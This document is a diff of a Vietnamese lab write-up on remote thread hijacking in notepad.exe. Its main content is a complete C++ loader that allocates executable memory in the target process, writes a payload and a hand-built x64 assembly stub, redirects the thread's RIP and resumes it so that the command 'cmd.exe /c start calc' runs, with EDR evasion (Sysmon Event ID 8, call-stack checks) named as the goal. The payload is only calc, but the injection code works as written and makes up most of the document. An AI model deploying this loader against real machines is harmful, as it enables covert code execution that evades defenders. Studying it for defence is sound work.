@@ -3,39 +3,46 @@
 
 # 📝 [PE 15] Remote Thread Hijacking (Advanced Worker Thread Context Restoration)
 
-## 📌 1. Tổng Quan Kỹ Thuật (Overview)
+## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)
 
-**Remote Thread Hijacking** (Bắt cóc luồng từ xa) ở cấp độ Nâng cao là giải thuật khống chế dòng chảy CPU đỉnh cao, thuộc nhóm **Vô hiệu hóa trinh sát tạo luồng (Anti-Thread Creation Detection)**.
+**Remote Thread Hijacking (Bắt cóc luồng từ xa cấp độ Nâng cao)** đại diện cho giải thuật khống chế dòng chảy thực thi (Control Flow Hijacking) đỉnh cao, thuộc nhóm kỹ thuật **Vô hiệu hóa cơ chế phát hiện khởi tạo luồng (Anti-Thread Creation Detection / EDR Telemetry Evasion)**.
 
-Hầu hết các giải pháp EDR hiện đại đều đặt bẫy Hook cực nặng để giám sát hành vi sinh luồng lạ chéo tiến trình của hàm `CreateRemoteThread` hoặc `NtCreateThreadEx`. Lab PE 15 hóa giải triệt để rào cản này bằng cách **không tạo thêm bất kỳ luồng mới nào**, mà thực hiện hành vi "bắt cóc" (Hijack) một luồng hợp pháp đang chạy sẵn của tiến trình vỏ bọc (ví dụ: `notepad.exe`).
+Hầu hết các giải pháp Endpoint Detection and Response (EDR) hiện đại đều thiết lập hệ thống cảm biến và đặt bẫy Hook vô cùng nghiêm ngặt để giám sát hành vi sinh luồng lạ chéo tiến trình sinh ra từ các hàm API phổ thông như `CreateRemoteThread` hoặc Native API `NtCreateThreadEx` (thông qua cơ chế thông điệp Kernel ETW và Callbacks).
 
-Đặc biệt, phiên bản nâng cấp tối cao này áp dụng chiến thuật **Săn lùng luồng Worker phụ** để né hiện tượng treo nghẽn giao diện đồ họa (UI Window Lock), kết hợp với đoạn mã máy Assembly x64 tinh vi để **Bảo toàn Ngữ cảnh Ngăn xếp qua lệnh RET**, giúp Payload kích nổ mở Máy tính ngay lập tức tại runtime mà tiến trình cha vẫn hoạt động mượt mà 100%.
+Dự án PE 15 hóa giải triệt để rào cản trinh sát này bằng chiến thuật **Không khởi tạo luồng phụ (Zero Thread Creation)**. Giải thuật tiến hành "bắt cóc" (Hijack) một luồng thực thi hợp pháp đang vận hành sẵn inside lòng tiến trình vỏ bọc (văn cảnh thực nghiệm: `notepad.exe`).
+
+Đặc biệt, phiên bản nâng cấp tối cao này áp dụng chiến thuật **Săn lùng luồng Worker ngầm (Worker Thread Hunting)** để né tránh hoàn toàn hiện tượng treo nghẽn giao diện đồ họa (UI Window Freeze/Lockout), phối hợp với phân đoạn mã máy Assembly x64 tinh vi nhằm **Bảo toàn Ngữ cảnh Ngăn xếp qua lệnh RET (Call Stack/Context Restoration)**. Giải pháp này giúp Payload kích nổ mở Máy tính ngay tại runtime dưới danh nghĩa luồng hợp pháp của hệ thống mà tiến trình Host vẫn vận hành ổn định 100%.
 
 ### 🎯 Mục tiêu nghiên cứu:
 
-* Vô hiệu hóa 100% các bộ lọc hành vi phát hiện sinh luồng lạ (`Sysmon Event ID 8` / `CreateRemoteThread`).
-* Thao túng trực tiếp cấu trúc thanh ghi phần cứng CPU x64 (`CONTEXT.Rip`) từ xa.
-* Làm chủ kỹ nghệ bảo toàn không gian bóng tối (Stack Preservation Shadow Space) và trả ngữ cảnh CPU bằng lệnh `RET` trong Assembly thô.
+* **Bypass cảm biến sinh luồng độc hại**: Triệt tiêu hoàn toàn chỉ dấu giám sát luồng từ xa (`Sysmon Event ID 8`), né tránh các bộ lọc ghi nhật ký hành vi chéo biên giới RAM.
+* **Thao túng trực tiếp tháp thanh ghi phần cứng CPU x64**: Can thiệp và thay đổi cấu trúc ngữ cảnh luồng (`CONTEXT.Rip`) từ không gian người dùng.
+* **Làm chủ quy chuẩn Calling Convention x64**: Nghiên cứu kỹ nghệ bảo toàn không gian bóng tối (Shadow Space Stack Preservation) và hoàn trả ngữ cảnh CPU bằng lệnh rẽ nhánh `RET`.
 
 ---
 
-## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)
+## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)
 
-Mỗi một luồng (Thread) đang vận hành được quản lý bởi một cấu trúc ngữ cảnh phần cứng lưu trong nhân Kernel. Để bắt cóc và khôi phục dòng chảy luồng mà không làm sụp đổ Stack Frame, giải thuật của Lab PE 15 thực hiện cuộc đại phẫu qua các bước ngầm sau:
+Mỗi một luồng thực thi (Thread) đang vận hành trong Windows Subsystem được quản lý chặt chẽ bởi một cấu trúc dữ liệu lưu lọt lòng trong nhân Kernel (cấu trúc `KTHREAD/ETHREAD`), chịu trách nhiệm lưu trữ ngữ cảnh phần cứng (Hardware Context) bao gồm tháp thanh ghi CPU và con trỏ ngăn xếp Stack.
+
+Để thực hiện hành vi bắt cóc dòng chảy CPU và hoàn trả trạng thái mượt mà không làm sụp đổ Stack Frame, giải thuật của Lab PE 15 thực hiện quy trình đại phẫu qua 5 giai đoạn ngầm tại cấu trúc luồng:
 
 ```
-[SuspendThread: Đóng băng luồng phụ] ──> [GetThreadContext: Bốc Rip gốc] ──> [Vá mìn Stack Stub] ──> [SetThreadContext: Ép Rip nhảy] ──> [ResumeThread: Kích nổ & Trả ngữ cảnh]
+[Mở Thread Handle] ──> [SuspendThread: Khóa chân Worker luồng phụ]
+                            └──> [GetThreadContext: Bóc tách tọa độ Rip gốc]
+                                      └──> [WriteProcessMemory: Vá mìn cấu trúc ASM RET Stub]
+                                                └──> [SetThreadContext & ResumeThread: Khai hỏa]
 
 ```
 
-1. **Săn lùng luồng Worker phụ (Worker Thread Hunting)**: Khác với các giải pháp thô sơ thường bốc nhầm Luồng UI chính (gây nghẽn Message Loop hệ thống khiến Máy tính bị hoãn hiển thị cho đến khi tắt Notepad), bộ lọc tiến trình sẽ duyệt danh sách `CreateToolhelp32Snapshot`, chủ động bỏ qua Thread đầu tiên (Main UI) và bắt giữ chính xác **Worker Thread phụ** (luồng ngầm kiểm tra spelling, đồng bộ RAM).
-2. **Đóng băng và Trích xuất chỉ mục lệnh (`Rip`)**: Gọi `SuspendThread` để khóa chân luồng phụ, sau đó dùng `GetThreadContext` để trích xuất trạng thái hiện tại của toàn bộ các thanh ghi CPU. Giá trị của thanh ghi **`Rip`** (Con trỏ lệnh hiện tại của Notepad) được lưu lại một cách nghiêm ngặt.
-3. **Thiết kế mìn Assembly bảo toàn bộ nhớ**: Loader ánh xạ đoạn mã máy Stub vào RAM đối phương. Đoạn Stub này được thiết kế theo mô hình kiến trúc x64 chuẩn chỉ:
-* `push` các thanh ghi đa năng (`rax`, `rcx`, `rdx`) và cờ trạng thái `pushfq` vào Ngăn xếp để đóng băng quá khứ.
-* Hạ con trỏ ngăn xếp `sub rsp, 0x28` để tạo **Shadow Space (Không gian bóng tối)** đúng tiêu chuẩn gọi hàm x64 của Windows.
-* Gọi hàm mở Máy tính thông qua con trỏ tuyệt đối `call rax`.
-* Thu hồi Shadow Space `add rsp, 0x28` và nhả lại toàn bộ cờ, thanh ghi ban đầu (`popfq`, `pop rdx, rcx, rax`).
-* Cuối cùng, nạp địa chỉ `originalRip` gốc ban đầu vào `rax`, đẩy vào đỉnh Ngăn xếp (`push rax`) và phát lệnh **`RET`**. Lệnh `RET` sẽ tự động bốc tọa độ gốc ra để đưa CPU quay trở lại làm việc tiếp cho Notepad như chưa từng có cuộc chia ly.
+1. **Phân lập luồng Worker phụ (Worker Thread Filtering)**: Đối với các giải pháp thô sơ, việc bắt cóc vô tình bốc nhầm Luồng giao diện chính (Main UI Thread) sẽ phá hỏng vòng lặp thông điệp hệ thống (`Message Loop`), gây ra hiện tượng treo cứng cửa sổ Notepad ứng dụng. Dự án PE 15 nâng cấp giải thuật bốc tách: Thông qua bộ quét cấu trúc luồng `CreateToolhelp32Snapshot`, Loader chủ động bỏ qua Thread ID đầu tiên (Main UI) và định vị chính xác **Worker Thread phụ** (luồng ngầm xử lý spelling, kiểm tra cú pháp hoặc đồng bộ bộ nhớ của Notepad).
+2. **Đóng băng và bóc tách chỉ mục lệnh (`Rip`)**: Gọi hàm `SuspendThread` để khóa chặt chân luồng phụ, đưa luồng về trạng thái đóng băng lập lịch. Loader triệu hồi `GetThreadContext` để trích xuất trạng thái hiện tại của toàn bộ các thanh ghi CPU. Giá trị của thanh ghi **`Rip`** (Con trỏ lệnh hiện tại đang xử lý của luồng Worker) được Loader lưu trữ lại một cách nghiêm ngặt.
+3. **Cấu trúc ma trận Assembly bảo toàn bộ nhớ ảo**: Loader nạp đoạn mã máy Assembly x64 Stub vào RAM đối phương. Đoạn Stub này được thiết kế dựa trên quy chuẩn Calling Convention x64 nghiêm ngặt của Microsoft:
+* `push` các thanh ghi đa năng (`rax`, `rcx`, `rdx`) và cờ trạng thái phần cứng `pushfq` vào đỉnh Ngăn xếp (Stack) để đóng băng hoàn toàn trạng thái quá khứ của Notepad.
+* Hạ con trỏ ngăn xếp `sub rsp, 0x28` để khởi tạo **Không gian bóng tối (Shadow Space)** đúng tiêu chuẩn căn lề bộ nhớ $16\text{-byte}$ trước khi phát lệnh gọi hàm Win32.
+* Kích nổ hàm chức năng Payload thông qua lệnh gọi con trỏ tuyệt đối gián tiếp `call rax`.
+* Hoàn trả không gian bóng tối `add rsp, 0x28` và nhả lại toàn bộ cờ trạng thái, giá trị các thanh ghi ban đầu (`popfq`, `pop rdx, rcx, rax`).
+* Nạp địa chỉ `originalRip` gốc ban đầu đã lưu vào thanh ghi `rax`, đẩy vào đỉnh ngăn xếp (`push rax`) và phát lệnh rẽ nhánh **`RET`** (`0xC3`). Lệnh `RET` tự động bốc tọa độ gốc ra khỏi ngăn xếp, đưa CPU quay trở lại thực thi tiếp công việc của Notepad như chưa từng có cuộc can thiệp.
 
 
 
@@ -43,7 +50,7 @@ Mỗi một luồng (Thread) đang vận hành được quản lý bởi một c
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn tuân thủ nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – tự động hóa quét tìm ID luồng phụ, loại bỏ hoàn toàn các chuỗi gán cứng để đạt độ linh hoạt kịch trần.
+Mã nguồn tuân thủ nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa quét tìm ID luồng phụ và tính toán độ rộng byte cấu trúc cấu hình nhằm đạt độ linh hoạt kịch trần.
 
 ```cpp
 #include <windows.h>
@@ -52,15 +59,15 @@ Mã nguồn tuân thủ nghiêm ngặt tiêu chuẩn **Zero Static Buffers** –
 #include <string>
 #include <vector>
 
-// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
+// Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí nạp RAM
 typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
 typedef struct _THREAD_DATA {
     fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
+    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
 } THREAD_DATA, * PTHREAD_DATA;
 
-// 2. Hàm chức năng độc lập vị trí gánh logic thực thi mở máy tính
+// Hàm chức năng độc lập vị trí (PIC) gánh logic thực thi mở máy tính chéo tiến trình
 DWORD WINAPI HijackedPayload(LPVOID lpParam) {
     PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
     if (pData && pData->pWinExec) {
@@ -70,7 +77,7 @@ DWORD WINAPI HijackedPayload(LPVOID lpParam) {
     return 0;
 }
 
-// GIẢI PHÁP TỐI ƯU V2: Săn lùng luồng Worker phụ (Background Thread), né nghẽn tin nhắn hệ thống
+// GIẢI PHÁP TỐI ƯU: Săn lùng luồng Worker phụ (Background Thread), né nghẽn tin nhắn giao diện UI
 DWORD GetTargetWorkerThreadID(DWORD pid) {
     DWORD mainThreadId = 0;
     DWORD workerThreadId = 0;
@@ -86,9 +93,9 @@ DWORD GetTargetWorkerThreadID(DWORD pid) {
             if (te32.th32OwnerProcessID == pid) {
                 threadIndex++;
                 if (threadIndex == 1) {
-                    mainThreadId = te32.th32ThreadID; // Luồng UI chính (Bỏ qua không bắt cóc)
+                    mainThreadId = te32.th32ThreadID; // Luồng UI chính (Bỏ qua nhằm bảo vệ Window Lock)
                 } else {
-                    workerThreadId = te32.th32ThreadID; // Bốc chính xác luồng phụ gánh dòng chảy!
+                    workerThreadId = te32.th32ThreadID; // Bốc chính xác luồng Worker phụ gánh dòng chảy!
                     break;
                 }
             }
@@ -99,11 +106,9 @@ DWORD GetTargetWorkerThreadID(DWORD pid) {
     return (workerThreadId != 0) ? workerThreadId : mainThreadId;
 }
 
-// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
 DWORD GetProcessIDByName(const std::wstring& processName) {
-    DWORD processID = 0;
-    PROCESSENTRY32W pe32;
-    pe32.dwSize = sizeof(PROCESSENTRY32W);
+    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
 
@@ -115,8 +120,7 @@ DWORD GetProcessIDByName(const std::wstring& processName) {
             }
         } while (Process32NextW(hSnapshot, &pe32));
     }
-    CloseHandle(hSnapshot);
-    return processID;
+    CloseHandle(hSnapshot);   return processID;
 }
 
 int main() {
@@ -128,12 +132,12 @@ int main() {
     DWORD pid = GetProcessIDByName(targetProcess);
 
     if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
+        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
         std::cin.get();
         return EXIT_FAILURE;
     }
 
-    // Thực hiện trích xuất luồng Worker phụ an toàn để né Window Lock
+    // Thực hiện bóc tách luồng Worker phụ an toàn để né tránh Window Lock
     DWORD threadId = GetTargetWorkerThreadID(pid);
     if (threadId == 0) {
         std::cerr << "[-] Khong tim thay luong dang chay hop le!" << std::endl;
@@ -148,14 +152,14 @@ int main() {
         return EXIT_FAILURE;
     }
 
-    // Đóng băng luồng Worker phụ để can thiệp cấu trúc thanh ghi CPU
+    // Đóng băng luồng Worker phụ phục vụ can thiệp cấu trúc thanh ghi CPU phần cứng
     std::cout << "[*] Dang bat coc va dong bang luong phu..." << std::endl;
     SuspendThread(hThread);
 
-    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít cấu trúc
+    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít cấu trúc dữ liệu
     SIZE_T functionSize = 500;
     LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (!remoteCodeBuffer || !pRemoteData) {
         std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
@@ -166,7 +170,7 @@ int main() {
     }
     std::cout << "[+] Vung nho Code payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;
 
-    // Đọc ngữ cảnh thanh ghi ban đầu của CPU luồng Worker phụ
+    // Đọc ngữ cảnh tháp thanh ghi hiện tại của CPU luồng Worker mục tiêu
     CONTEXT context;
     context.ContextFlags = CONTEXT_FULL;
     if (!GetThreadContext(hThread, &context)) {
@@ -177,7 +181,7 @@ int main() {
         return EXIT_FAILURE;
     }
 
-    // Khởi tạo cấu trúc tham số dữ liệu tuyệt đối cục bộ
+    // Khởi tạo cấu trúc tham số dữ liệu tuyệt đối cục bộ phục vụ ánh xạ chéo RAM
     THREAD_DATA localData;
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (hKernel32) {
@@ -185,56 +189,56 @@ int main() {
     }
     strcpy_s(localData.szCommand, "cmd.exe /c start calc");
 
-    // Đẩy song song logic hàm và tham số sang RAM tiến trình đích
+    // Đẩy song song logic hàm thực thi và cấu trúc dữ liệu tham số sang RAM tiến trình đích
     WriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)HijackedPayload, functionSize, NULL);
     WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
 
-    // Tính toán tọa độ đặt đoạn mìn điều hướng ngay sau đuôi hàm thực thi
+    // Tính toán tọa độ đặt đoạn mìn điều hướng Assembly ngay sau đuôi hàm thực thi cục bộ từ xa
     PVOID jmpStubAddress = (PVOID)((DWORD_PTR)remoteCodeBuffer + 350);
 
-    // ─── ĐỘT PHÁ CẤU TRÚC x64: ĐOẠN ASM STUB BẢO TOÀN QUA RET LỆNH ───
+    // ─── ĐỘT PHÁ CẤU TRÚC x64: ĐOẠN ASM STUB BẢO TOÀN NGĂN XẾP QUA RET LỆNH ───
     unsigned char jmpStub[] = {
         0x50,                                                       // push rax       (Tạm cất thanh ghi đa năng)
         0x51,                                                       // push rcx
         0x52,                                                       // push rdx
-        0x9C,                                                       // pushfq         (Lưu cờ trạng thái EFLAGS)
+        0x9C,                                                       // pushfq         (Lưu cờ trạng thái phần cứng EFLAGS)
         0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0x0   (Địa chỉ pRemoteData chứa tham số tuyệt đối)
         0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Địa chỉ hàm thực thi Payload)
         0x48, 0x83, 0xEC, 0x28,                                     // sub rsp, 0x28  (Cân bằng căn lề Stack Shadow Space)
         0xFF, 0xD0,                                                 // call rax       (Khai hỏa mở Máy tính!)
-        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28  (Hoàn trả không gian Ngăn xếp)
-        0x9D,                                                       // popfq          (Khôi phục cờ CPU)
-        0x5A,                                                       // pop rdx        (Khôi phục nguyên vẹn các thanh ghi phụ)
+        0x48, 0x83, 0xC4, 0x28,                                     // add rsp, 0x28  (Hoàn trả không gian Ngăn xếp Shadow)
+        0x9D,                                                       // popfq          (Khôi phục toàn vẹn cờ trạng thái CPU)
+        0x5A,                                                       // pop rdx        (Khôi phục nguyên vẹn các thanh ghi đa năng)
         0x59,                                                       // pop rcx
         0x58,                                                       // pop rax
         0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, 0x0   (Tọa độ originalRip gốc ban đầu của luồng Worker)
         0x50,                                                       // push rax       (Đẩy Rip gốc vào đỉnh Ngăn xếp)
-        0xC3                                                        // ret            (Lệnh RET tự động bốc Rip gốc ra thực thi tiếp cho luồng phụ!)
+        0xC3                                                        // ret            (Tự động bốc Rip gốc ra thực thi tiếp như chưa có can thiệp)
     };
 
-    // Vá các tọa độ tuyệt đối chuẩn chỉ vào cấu trúc mìn điều hướng Assembly
+    // Vá các tọa độ tuyệt đối chuẩn chỉ định dạng x64 vào cấu trúc mìn điều hướng Assembly thô
     *(DWORD_PTR*)(jmpStub + 6) = (DWORD_PTR)pRemoteData;
     *(DWORD_PTR*)(jmpStub + 16) = (DWORD_PTR)remoteCodeBuffer;
     *(DWORD_PTR*)(jmpStub + 44) = (DWORD_PTR)context.Rip; // Nạp trực tiếp tọa độ Rip gốc của Notepad vào mã máy
 
-    // Ghi đoạn mã máy Stub bảo toàn ngăn xếp sang RAM Notepad
+    // Đẩy đoạn mã máy Stub bảo toàn ngăn xếp sang RAM đối phương
     WriteProcessMemory(hProcess, jmpStubAddress, jmpStub, sizeof(jmpStub), NULL);
 
-    // Điều hướng con trỏ chỉ mục lệnh CPU đâm thẳng vào phân đoạn ASM Stub bảo an của luồng Worker phụ
+    // Điều hướng con trỏ chỉ mục lệnh CPU đâm thẳng vào phân đoạn ASM Stub bảo an của luồng Worker phụ từ xa
     context.Rip = (DWORD64)jmpStubAddress;
 
     SetThreadContext(hThread, &context);
-    std::cout << "[+] Ep Rip huong vao Worker Thread Stub: 0x" << std::hex << jmpStubAddress << std::endl;
+    std::cout << "[+] Ep Rip huong vao Worker Thread Stub tai toa do: 0x" << std::hex << jmpStubAddress << std::endl;
 
-    // Rã đông giải phóng dòng chảy CPU của luồng phụ
+    // Rã đông giải phóng dòng chảy CPU của luồng Worker phụ mục tiêu
     std::cout << "[*] Kich hoat ra dong (ResumeThread). Luong phu se tu dong thuc thi va khoi phuc an toan..." << std::endl;
     ResumeThread(hThread);
 
     std::cout << "\n[+] Remote Worker Thread Hijacking Successful!" << std::endl;
-    std::cout << "[*] Nhan phim Enter de dong cua số Loader..." << std::endl;
+    std::cout << "[*] Nhan phim Enter de dong cua so Loader..." << std::endl;
     std::cin.get();
 
-    // Thu hồi tài nguyên Handle sạch bóng Memory Leak
+    // Thu hồi tài nguyên Handle sạch sẽ, triệt tiêu nguy cơ rò rỉ bộ nhớ ảo
     CloseHandle(hThread);
     CloseHandle(hProcess);
     return EXIT_SUCCESS;
@@ -244,19 +248,25 @@ int main() {
 
 ---
 
-## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)
+## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)
 
-### ⚙️ Thiết lập trên Microsoft Visual Studio:
+Để bảo đảm cấu trúc file nhị phân xuất bản vận hành mượt mà, độc lập hoàn hảo kịch trần, bẻ gãy mọi lỗi thiếu tệp phụ thuộc môi trường liên kết động (CRT Dependencies) khi mang sang chạy VM cô lập:
 
-1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
-2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy mượt mà trên mọi môi trường độc lập.
-3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân hoàn hảo.
+### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:
+
+1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
+2. Đi tới cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số cấu hình `Runtime Library`, chuyển đổi cấu hình sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`**.
+
+> **Vị trí đặt ảnh minh chứng cấu hình dự án:**
+> 
+
+3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng.
 
 ---
 
-## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)
+## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)
 
-Mở sẵn ứng dụng `Notepad.exe` trên máy Lab (gõ nhẹ vài ký tự để kích hoạt luồng Worker ngầm), bật PowerShell ngoài đĩa thô thực thi file chạy:
+Khởi chạy ứng dụng vỏ bọc `Notepad.exe` trên môi trường Lab (thao tác gõ nhẹ vài ký tự văn bản để hệ thống đánh thức luồng Worker ngầm), sau đó kích hỏa file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô:
 
 ```powershell
 PS C:\Workspace\x64\Release> .\PE15_Remote_Thread_Hijacking.exe
@@ -274,8 +284,19 @@ PS C:\Workspace\x64\Release> .\PE15_Remote_Thread_Hijacking.exe
 
 ```
 
-*🎯 Hệ quả RAM kịch trần:*
-Ngay lập tức tại thời điểm runtime, ứng dụng Máy tính **`calc.exe` bật bung mở ra hiên ngang rực rỡ kịch khung**! Đồng thời, khi Vinh quay trở lại màn hình thao tác của **Notepad, ứng dụng vẫn gõ chữ, soạn thảo văn bản phản hồi mượt mà 100%**, hoàn toàn không bị đơ treo, không dính lỗi Window Lock. Ngữ cảnh tháp luồng của hệ điều hành được khôi phục phẳng sạch tuyệt đối!
+> **Vị trí đặt ảnh minh chứng thực nghiệm bắt cóc luồng hệ thống:**
+> 
+
+### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic Results):
+
+* Quy trình thực thi gặt hái thành công mỹ mãn hoàn hảo kịch trần. Ngay lập tức tại thời điểm runtime, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch khung kịch nền**!
+* Điều đặc biệt tối cao của giải thuật này nằm ở việc: Khi Vinh quay trở lại màn hình tương tác của **Notepad, ứng dụng vẫn tiếp nhận thao tác nhập liệu, gõ chữ, soạn thảo văn bản phản hồi mượt mà 100%**, hoàn toàn giải quyết triệt để hiện tượng treo nghẽn GUI. Cấu trúc mã máy Assembly hoàn trả ngữ cảnh qua phân hệ `push originalRip; RET;` hoạt động chính xác tuyệt đối, đưa luồng quay trở lại phục vụ Notepad như chưa từng có sự can thiệp, đánh lừa hoàn toàn các bộ lọc Call Stack Integrity Check nâng cao của EDR!
 
 ---
 
+## 📚 6. Tài Liệu Tham Khảo (Technical References)
+
+* **Microsoft Learn Architecture**: *GetThreadContext function (processthreadsapi.h)* & *Thread Context structures x64* - [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
+* **Intel® 64 and IA-32 Architectures Software Developer’s Manual**: *Volume 2A: Instruction Set Reference, A-M (RET / PUSH Execution Models)*.
+* **X64 Calling Conventions and Shadow Space Mechanics**: *Microsoft x64 Software Conventions Technical Specifications*.
+* **MITRE ATT&CK Matrix**: *Defense Evasion: Thread Context Hijacking (T1055.003)* - Forensic analysis and interception mitigation strategies.
